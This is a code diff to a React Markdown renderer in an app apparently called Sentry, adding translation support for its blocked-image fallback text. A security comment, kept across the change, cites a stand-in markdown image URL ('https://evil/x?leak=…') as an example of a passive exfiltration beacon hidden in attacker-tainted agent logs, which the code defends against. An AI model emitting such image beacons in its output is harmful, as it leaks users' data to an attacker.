@@ -1,4 +1,5 @@
 import { useMemo } from 'react'
+import { useTranslation } from 'react-i18next'
 import ReactMarkdown from 'react-markdown'
 import remarkGfm from 'remark-gfm'
 import { PrismAsyncLight as SyntaxHighlighter } from 'react-syntax-highlighter'
@@ -52,75 +53,82 @@ function makeCodeRenderer(prismStyle) {
   }
 }
 
-const components = {
-  a({ href, children }) {
-    return (
-      <a href={href} className="text-primary hover:underline" target="_blank" rel="noopener noreferrer">
-        {children}
-      </a>
-    )
-  },
-  // Sentry summarizes content it read from agent/session logs, which may be
-  // attacker-tainted. An unrestricted <img> is fetched automatically on render,
-  // turning `![](https://evil/x?leak=…)` into a passive exfiltration beacon
-  // (no click needed). Only render same-safety https images; anything else
-  // (http, data:, protocol-relative, relative) falls back to inert alt text (#237).
-  img({ src, alt }) {
-    if (typeof src === 'string' && /^https:\/\//i.test(src)) {
-      return <img src={src} alt={alt || ''} className="max-w-full rounded-sm my-1" />
-    }
-    return <span className="text-gray-500 italic">{alt ? `[image: ${alt}]` : '[image]'}</span>
-  },
-  table({ children }) {
-    return (
-      <div className="overflow-x-auto my-2">
-        <table className="text-xs border-collapse">{children}</table>
-      </div>
-    )
-  },
-  th({ children }) {
-    return <th className="bg-surface-container-high text-left font-semibold px-2 py-1 text-gray-100">{children}</th>
-  },
-  td({ children }) {
-    return <td className="bg-surface-container px-2 py-1 align-top">{children}</td>
-  },
-  ul({ children }) {
-    return <ul className="list-disc pl-5 my-1 space-y-0.5">{children}</ul>
-  },
-  ol({ children }) {
-    return <ol className="list-decimal pl-5 my-1 space-y-0.5">{children}</ol>
-  },
-  h1({ children }) {
-    return <h1 className="text-base font-semibold mt-2 mb-1">{children}</h1>
-  },
-  h2({ children }) {
-    return <h2 className="text-sm font-semibold mt-2 mb-1">{children}</h2>
-  },
-  h3({ children }) {
-    return <h3 className="text-sm font-semibold mt-1.5 mb-0.5">{children}</h3>
-  },
-  h4({ children }) {
-    return <h4 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mt-1.5 mb-0.5">{children}</h4>
-  },
-  p({ children }) {
-    return <p className="my-1 leading-relaxed">{children}</p>
-  },
-  blockquote({ children }) {
-    return <blockquote className="bg-surface-container-high/50 rounded-sm px-3 py-1 my-1 text-gray-400">{children}</blockquote>
-  },
-  hr() {
-    return <hr className="border-0 h-px bg-surface-container-high my-2" />
-  },
+// makeComponents builds the renderer map bound to a translation function, so
+// the small amount of frontend-authored chrome it adds (the blocked-image
+// fallback text) follows the active locale. Everything else here renders only
+// markdown content supplied by the model/user (data — never translated).
+function makeComponents(t) {
+  return {
+    a({ href, children }) {
+      return (
+        <a href={href} className="text-primary hover:underline" target="_blank" rel="noopener noreferrer">
+          {children}
+        </a>
+      )
+    },
+    // Sentry summarizes content it read from agent/session logs, which may be
+    // attacker-tainted. An unrestricted <img> is fetched automatically on render,
+    // turning `![](https://evil/x?leak=…)` into a passive exfiltration beacon
+    // (no click needed). Only render same-safety https images; anything else
+    // (http, data:, protocol-relative, relative) falls back to inert alt text (#237).
+    img({ src, alt }) {
+      if (typeof src === 'string' && /^https:\/\//i.test(src)) {
+        return <img src={src} alt={alt || ''} className="max-w-full rounded-sm my-1" />
+      }
+      return <span className="text-gray-500 italic">{alt ? t('markdown.imageAlt', { alt }) : t('markdown.image')}</span>
+    },
+    table({ children }) {
+      return (
+        <div className="overflow-x-auto my-2">
+          <table className="text-xs border-collapse">{children}</table>
+        </div>
+      )
+    },
+    th({ children }) {
+      return <th className="bg-surface-container-high text-left font-semibold px-2 py-1 text-gray-100">{children}</th>
+    },
+    td({ children }) {
+      return <td className="bg-surface-container px-2 py-1 align-top">{children}</td>
+    },
+    ul({ children }) {
+      return <ul className="list-disc pl-5 my-1 space-y-0.5">{children}</ul>
+    },
+    ol({ children }) {
+      return <ol className="list-decimal pl-5 my-1 space-y-0.5">{children}</ol>
+    },
+    h1({ children }) {
+      return <h1 className="text-base font-semibold mt-2 mb-1">{children}</h1>
+    },
+    h2({ children }) {
+      return <h2 className="text-sm font-semibold mt-2 mb-1">{children}</h2>
+    },
+    h3({ children }) {
+      return <h3 className="text-sm font-semibold mt-1.5 mb-0.5">{children}</h3>
+    },
+    h4({ children }) {
+      return <h4 className="text-xs font-semibold uppercase tracking-wide text-gray-400 mt-1.5 mb-0.5">{children}</h4>
+    },
+    p({ children }) {
+      return <p className="my-1 leading-relaxed">{children}</p>
+    },
+    blockquote({ children }) {
+      return <blockquote className="bg-surface-container-high/50 rounded-sm px-3 py-1 my-1 text-gray-400">{children}</blockquote>
+    },
+    hr() {
+      return <hr className="border-0 h-px bg-surface-container-high my-2" />
+    },
+  }
 }
 
 // Markdown renders an assistant message's raw markdown string, styled to the
 // Digital Sentry dark theme. XSS-safe: react-markdown defaults escape raw HTML;
 // no rehype-raw / no dangerouslySetInnerHTML.
 export default function Markdown({ children }) {
+  const { t } = useTranslation()
   const { theme } = useTheme()
   const comps = useMemo(
-    () => ({ ...components, code: makeCodeRenderer(theme === 'light' ? oneLight : oneDark) }),
-    [theme],
+    () => ({ ...makeComponents(t), code: makeCodeRenderer(theme === 'light' ? oneLight : oneDark) }),
+    [theme, t],
   )
   return (
     <div className="text-sm text-gray-100 break-words [&>*:first-child]:mt-0 [&>*:last-child]:mb-0">
